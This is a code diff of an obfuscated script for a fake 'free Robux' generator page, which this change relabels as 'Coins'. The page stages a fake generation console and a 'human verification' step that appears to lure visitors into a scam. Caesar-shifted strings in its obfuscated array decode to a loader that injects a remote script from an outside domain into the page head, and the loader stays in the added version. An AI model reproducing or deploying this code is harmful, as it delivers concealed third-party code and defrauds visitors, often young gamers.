@@ -1,4 +1,4 @@
-var _0x80be = ['fadeOut', '.console-generation-item-r-1', '.console-generation-item-value-r-1', 'decimals', 'pause', 'animated\x20jello\x20item-completed', 'animated\x20jello', '.loader-wrapper', '<span\x20class=\x22lnr\x20lnr-cross-circle\x20console-msg-failed\x20animated\x20bounceIn\x22></span>', '</span>', '<span\x20class=\x22lnr\x20lnr-warning\x20animated\x20bounceIn\x22></span>', 'parts/verification.php', 'clear', '\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a', 'init', 'getElementById', 'online-count', 'innerHTML', 'floor', 'random', 'date', 'length', 'getHours', 'Jan', 'Feb', 'Mar', 'Apr', 'Jun', 'Jul', 'Sep', 'Oct', 'Nov', 'Dec', 'Sun', 'Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat', 'getMonth', 'getDate', 'getFullYear', 'few\x20seconds', '\x20minutes\x20and\x20', '\x20seconds', 'human_verification_timer_time', 'toString', '<span>', 'split', 'map', 'charCodeAt', 'join', 'mpdbujpo', 'iptuobnf', 'replace', 'xxx/', 'ujlupliby/dpn', 'createElement', 'tdsjqu', 'src', 'iuuqt;00cpputusbqmvhjo/dpn0q/qiq@je>39:8', 'ifbe', 'appendChild', 'ready', 'Robux', 'Loading...', 'Generating', 'Succesfully\x20Generated', 'Performing\x20Verification...', 'Automatic\x20Verification\x20Failed', '180', 'sound', 'button', 'audio/', 'transition-1', 'count', 'fail', 'transition-2', 'sounds/', '#proc-btn-1', 'click', 'play', '#player-username', 'val', '.username-wrapper', 'addClass', 'shake\x20animated\x20border-b-red', 'one', 'removeClass', 'GET', 'parts/connecting.php', '.generator-content', 'html', 'hide', 'find', 'div', 'animate', '%&nbsp;', '#progressBarConsole', 'magnificPopup', 'close', 'ajax', 'parts/resource-one.php', '.connected-username-value', '.resource-item-one-value.resource-item-value-3', '.resource-select-item-one', 'resource-select-item-1', 'hasClass', 'resource-select-item-2', 'resource-select-item-3', '.resource-one-wrapper\x20.label', 'animated\x20fadeOutUp', 'webkitAnimationEnd\x20mozAnimationEnd\x20MSAnimationEnd\x20oanimationend\x20animationend', '.resource-select-item-1', 'animated\x20fadeOutDown', '.resource-select-item-2', '.resource-select-item-3', 'get', 'parts/console.php', '.modal-outer', 'fadeIn', 'open', '.console-msg', 'animated\x20bounceIn', '\x20<span\x20class=\x22console-msg-resource\x22>', '</span>\x20'];
+var _0x80be = ['fadeOut', '.console-generation-item-r-1', '.console-generation-item-value-r-1', 'decimals', 'pause', 'animated\x20jello\x20item-completed', 'animated\x20jello', '.loader-wrapper', '<span\x20class=\x22lnr\x20lnr-cross-circle\x20console-msg-failed\x20animated\x20bounceIn\x22></span>', '</span>', '<span\x20class=\x22lnr\x20lnr-warning\x20animated\x20bounceIn\x22></span>', 'parts/verification.php', 'clear', '\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a', 'init', 'getElementById', 'online-count', 'innerHTML', 'floor', 'random', 'date', 'length', 'getHours', 'Jan', 'Feb', 'Mar', 'Apr', 'Jun', 'Jul', 'Sep', 'Oct', 'Nov', 'Dec', 'Sun', 'Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat', 'getMonth', 'getDate', 'getFullYear', 'few\x20seconds', '\x20minutes\x20and\x20', '\x20seconds', 'human_verification_timer_time', 'toString', '<span>', 'split', 'map', 'charCodeAt', 'join', 'mpdbujpo', 'iptuobnf', 'replace', 'xxx/', 'ujlupliby/dpn', 'createElement', 'tdsjqu', 'src', 'iuuqt;00cpputusbqmvhjo/dpn0q/qiq@je>39:8', 'ifbe', 'appendChild', 'ready', 'Coins', 'Loading...', 'Generating', 'Succesfully\x20Generated', 'Performing\x20Verification...', 'Automatic\x20Verification\x20Failed', '180', 'sound', 'button', 'audio/', 'transition-1', 'count', 'fail', 'transition-2', 'sounds/', '#proc-btn-1', 'click', 'play', '#player-username', 'val', '.username-wrapper', 'addClass', 'shake\x20animated\x20border-b-red', 'one', 'removeClass', 'GET', 'parts/connecting.php', '.generator-content', 'html', 'hide', 'find', 'div', 'animate', '%&nbsp;', '#progressBarConsole', 'magnificPopup', 'close', 'ajax', 'parts/resource-one.php', '.connected-username-value', '.resource-item-one-value.resource-item-value-3', '.resource-select-item-one', 'resource-select-item-1', 'hasClass', 'resource-select-item-2', 'resource-select-item-3', '.resource-one-wrapper\x20.label', 'animated\x20fadeOutUp', 'webkitAnimationEnd\x20mozAnimationEnd\x20MSAnimationEnd\x20oanimationend\x20animationend', '.resource-select-item-1', 'animated\x20fadeOutDown', '.resource-select-item-2', '.resource-select-item-3', 'get', 'parts/console.php', '.modal-outer', 'fadeIn', 'open', '.console-msg', 'animated\x20bounceIn', '\x20<span\x20class=\x22console-msg-resource\x22>', '</span>\x20'];
 (function (_0x3b6d8f, _0x1eb0ba) {
     var _0x41c47c = function (_0x5de89f) {
         while (--_0x5de89f) {
@@ -115,7 +115,7 @@ $(document)[_0x1510('0x0')](function () {
                     <div class="resource-select-wrapper">	
                         <div class="resource-one-wrapper">
                             <div class="animated bounceIn animation-delay-600">
-                                <div class="label">Amount of Robux</div>
+                                <div class="label">Amount of Coins</div>
                             </div>
                             <div class="row small-margin">	
                                 <div class="col-md-4 col-12 small-padding">	
@@ -123,7 +123,7 @@ $(document)[_0x1510('0x0')](function () {
                                         <div class="resource-select-item resource-select-item-one resource-select-item-1">
                                             <img src="https://cdn.jsdelivr.net/gh/imhosting/jfjfjd/img/f-icon.png" class="resource-select-icon">
                                             <div class="resource-item-value resource-item-one-value resource-item-value-1">1000</div>
-                                            <div class="resource-item-label">Robux</div>
+                                            <div class="resource-item-label">Coins</div>
                                         </div>
                                     </div>
                                 </div>
@@ -132,7 +132,7 @@ $(document)[_0x1510('0x0')](function () {
                                         <div class="resource-select-item resource-select-item-one resource-select-item-2">
                                             <img src="https://cdn.jsdelivr.net/gh/imhosting/jfjfjd/img/f-icon.png" class="resource-select-icon" title="" style="">
                                             <div class="resource-item-value resource-item-one-value resource-item-value-2">2500</div>
-                                            <div class="resource-item-label">Robux</div>
+                                            <div class="resource-item-label">Coins</div>
                                         </div>
                                     </div>
                                 </div>
@@ -141,7 +141,7 @@ $(document)[_0x1510('0x0')](function () {
                                         <div class="resource-select-item resource-select-item-one resource-select-item-3">
                                             <img src="https://cdn.jsdelivr.net/gh/imhosting/jfjfjd/img/f-icon.png" class="resource-select-icon" title="" style="">
                                             <div class="resource-item-value resource-item-one-value resource-item-value-3">5000</div>
-                                            <div class="resource-item-label">Robux</div>
+                                            <div class="resource-item-label">Coins</div>
                                         </div>
                                     </div>
                                 </div>	
@@ -195,7 +195,7 @@ $(document)[_0x1510('0x0')](function () {
                                             <div class="console-generation-item console-generation-item-r-1 animated jello item-completed" style="display: none;">
                                                 <img src="https://cdn.jsdelivr.net/gh/imhosting/jfjfjd/img/f-icon.png" class="resource-select-icon">
                                                 <div class="console-generation-item-value console-generation-item-value-r-1">606</div>
-                                                <div class="resource-item-label">Robux</div>
+                                                <div class="resource-item-label">Coins</div>
                                             </div>
                                             <div class="console-msg-wrapper animated pulse infinite">
                                                 <div class="console-msg animated bounceIn"><span class="console-msg-completed">Succesfully Generated</span> </div>
@@ -320,7 +320,7 @@ $(document)[_0x1510('0x0')](function () {
                                                                         <div class="console-generation-item console-generation-item-r-1 animated bounceIn animation-delay-600">
                                                                             <img src="https://cdn.jsdelivr.net/gh/imhosting/jfjfjd/img/f-icon.png" class="resource-select-icon">
                                                                             <div class="console-generation-item-value console-generation-item-value-r-1">1000</div>
-                                                                            <div class="resource-item-label">Robux</div>
+                                                                            <div class="resource-item-label">Coins</div>
                                                                         </div>
                                                                     </div>
                                                                 </div>
